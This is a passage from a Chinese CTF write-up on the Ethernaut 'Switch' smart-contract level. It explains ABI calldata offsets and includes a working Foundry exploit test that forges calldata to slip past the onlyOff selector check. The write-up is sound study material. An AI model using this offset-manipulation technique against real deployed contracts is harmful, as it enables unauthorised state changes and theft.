@@ -600,3 +600,73 @@ contract Attack {
     }
 }
 ```
+## Switch
+
+问了chatgpt calldata的编码格式：
+```
+calldata = function_selector(4 bytes)
+            + offset_of_dynamic_arg(32 bytes)
+            + dynamic_arg_length(32 bytes)
+            + dynamic_arg_data(variable)
+
+```
+“dynamic”很重要，参数的起始偏移并不是固定的
+
+回到题目的分析上。flipSwitch接收`_data`作为参数，而这个参数用来控制`address(this).call(_data)`处调用的函数
+
+onlyOff修饰符用calldatacopy检查`msg.data`偏移68处开始的4个字节是否等于offSelector。嗯？它为什么要这样检查？参考上述编码格式，onlyOff里得到的calldata其实是调用flipSwitch的calldata，结构如下：
+| 位置          | 内容                             |
+| ----------- | ------------------------------ |
+| 0x00 – 0x03 | `flipSwitch(bytes)` 的 selector |
+| 0x04 – 0x23 | `_data` 的偏移量（一般是 0x20）         |
+| 0x24 – 0x43 | `_data` 的 length               |
+| 0x44 – …    | `_data` 的内容  |
+
+68，或者说0x44，正好是`_data`的起始处。如果我们想让flipSwitch内部调用turnSwitchOn，`_data`的前4个字节（function selector的位置）就必须是turnSwitchOn，进而过不了检查
+
+然而话又说回来，“一般是 0x20”说明“可以不是0x20”。假如我们直接用`contract.flipSwitch`调用偏移就是0x20；但如果用call底层调用，我们就能自由控制msg.data，进而修改`_data` 的内容所在的位置
+
+以下是测试代码，放在project的test目录下，用`forge test -vv`运行。不知道为什么，我没有办法创建这题的实例（很奇怪，只有这题不行，其他题好好的），无法真正解出这题
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/Interfaces.sol";
+
+contract SwitchTest is Test {
+    Switch s;
+
+    function setUp() public {
+        s = new Switch();
+    }
+
+    function testExploit() public {
+        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
+        bytes4 onSel = bytes4(keccak256("turnSwitchOn()"));
+        bytes4 offSel = bytes4(keccak256("turnSwitchOff()"));
+        uint256 customOffset = 0x80; //其他的偏移X也行,只要X+4对应的地方记录的是data length，X+36是data起始处即可
+        bytes memory calldataPrefix = abi.encodePacked(flipSelector, uint256(customOffset));
+        uint256 padTo44 = 0x44 - calldataPrefix.length;
+        bytes memory midPadding = new bytes(padTo44);
+        bytes memory realData = abi.encodePacked(onSel);
+        uint256 L = realData.length;
+        bytes memory tail = abi.encodePacked(uint256(L));
+        uint256 currentLen = calldataPrefix.length + midPadding.length;
+        uint256 padTo80 = customOffset - currentLen;
+        bytes memory padTo80Bytes = new bytes(padTo80);
+
+        bytes memory fullCalldata = abi.encodePacked(
+            calldataPrefix,
+            midPadding,
+            offSel,
+            padTo80Bytes,
+            tail,
+            realData
+        );
+        (bool ok, ) = address(s).call(fullCalldata);
+        assertTrue(ok,"Failed to call");
+        assertTrue(s.switchOn(),"Failed to open the switch");
+    }
+}
+```
